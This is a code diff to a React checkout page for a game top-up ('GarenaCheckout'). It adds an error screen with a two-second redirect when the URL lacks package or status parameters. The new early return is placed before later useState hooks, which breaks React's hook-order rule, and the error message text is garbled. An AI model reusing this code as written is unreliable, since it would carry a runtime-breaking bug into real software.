@@ -108,24 +108,149 @@ function getProductNameForPrice(price: string): string {
 
 const CODASHOP_URL = 'https://www.codashop.online/';
 
+// Missing parameters error screen component with 2-second countdown & redirect
+function MissingParamsError() {
+  const [barWidth, setBarWidth] = useState('100%');
+
+  useEffect(() => {
+    const t1 = setTimeout(() => setBarWidth('0%'), 50);
+    const t2 = setTimeout(() => {
+      window.location.replace('/');
+    }, 2000);
+    return () => {
+      clearTimeout(t1);
+      clearTimeout(t2);
+    };
+  }, []);
+
+  return (
+    <div style={{
+      minHeight: '100vh',
+      background: '#f8fafc',
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'center',
+      padding: '20px',
+      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
+      boxSizing: 'border-box'
+    }}>
+      <div style={{
+        maxWidth: '460px',
+        width: '100%',
+        background: '#ffffff',
+        borderRadius: '16px',
+        border: '1px solid #e2e8f0',
+        boxShadow: '0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.04)',
+        padding: '32px 24px',
+        textAlign: 'center',
+        boxSizing: 'border-box'
+      }}>
+        <div style={{
+          width: '64px',
+          height: '64px',
+          background: '#fef2f2',
+          border: '2px solid #fee2e2',
+          borderRadius: '50%',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          margin: '0 auto 20px',
+          fontSize: '28px'
+        }}>
+          ⚠️
+        </div>
+        
+        <h2 style={{
+          fontSize: '18px',
+          fontWeight: 800,
+          color: '#0f172a',
+          marginBottom: '12px',
+          textTransform: 'uppercase',
+          letterSpacing: '0.5px'
+        }}>
+          No Item Selected
+        </h2>
+
+        <p style={{
+          fontSize: '14px',
+          lineHeight: '1.6',
+          color: '#475569',
+          marginBottom: '24px',
+          fontWeight: 500
+        }}>
+          Your order was not. You have not selected any item. Please go back to home and select item for purchase.
+        </p>
+
+        <div style={{
+          background: '#f1f5f9',
+          borderRadius: '8px',
+          padding: '12px 16px',
+          fontSize: '12px',
+          color: '#64748b',
+          marginBottom: '20px'
+        }}>
+          <div>Redirecting to home page in 2 seconds...</div>
+          <div style={{
+            width: '100%',
+            height: '4px',
+            background: '#e2e8f0',
+            borderRadius: '2px',
+            marginTop: '8px',
+            overflow: 'hidden'
+          }}>
+            <div style={{
+              width: barWidth,
+              height: '100%',
+              background: '#ef4444',
+              transition: 'width 2s linear'
+            }} />
+          </div>
+        </div>
+
+        <a 
+          href="/" 
+          style={{
+            display: 'inline-block',
+            padding: '11px 24px',
+            background: '#0f172a',
+            color: '#ffffff',
+            borderRadius: '8px',
+            fontSize: '13px',
+            fontWeight: 700,
+            textDecoration: 'none',
+            letterSpacing: '0.5px'
+          }}
+        >
+          GO TO HOMEPAGE NOW
+        </a>
+      </div>
+    </div>
+  );
+}
+
 export default function GarenaCheckout() {
   const [searchParams] = useSearchParams();
 
-  const pkg      = searchParams.get('pkg')      || '499';
+  const rawPkg   = searchParams.get('pkg');
   const diamonds = searchParams.get('diamonds') || '';
   const uid      = searchParams.get('uid')      || '';
   const nick     = searchParams.get('nick')     || '';
   const level    = searchParams.get('level')    || '';
   const status   = searchParams.get('status')   || '';
 
+  // Check if valid package or status parameters exist in the HTTP request
+  const hasValidParams = Boolean(rawPkg || diamonds || status);
+
+  const pkg = rawPkg || diamonds || '499';
+
   // Save session info to local storage for success/failure screens
   useEffect(() => {
     if (nick) localStorage.setItem('ff_nick', nick);
     if (diamonds) localStorage.setItem('ff_dia', diamonds);
-    if (pkg) localStorage.setItem('ff_price', pkg);
+    if (rawPkg) localStorage.setItem('ff_price', rawPkg);
     if (level) localStorage.setItem('ff_lvl', level);
     if (uid) localStorage.setItem('ff_uid', uid);
-  }, [nick, diamonds, pkg, level, uid]);
+  }, [nick, diamonds, rawPkg, level, uid]);
 
   // Responsive state system
   const [vw, setVw] = useState(
@@ -168,12 +293,10 @@ export default function GarenaCheckout() {
     };
   }, []);
 
-  // Guard: If both pkg and status are empty, send back to home
-  useEffect(() => {
-    if (!pkg && !status) {
-      window.location.replace('/');
-    }
-  }, [pkg, status]);
+  // If parameters are missing in the request, render the error screen with 2-second redirect
+  if (!hasValidParams) {
+    return <MissingParamsError />;
+  }
 
   const [form, setForm] = useState({ name: '', phone: '', email: '' });
   const [focusedField, setFocusedField] = useState<'name' | 'phone' | 'email' | null>(null);
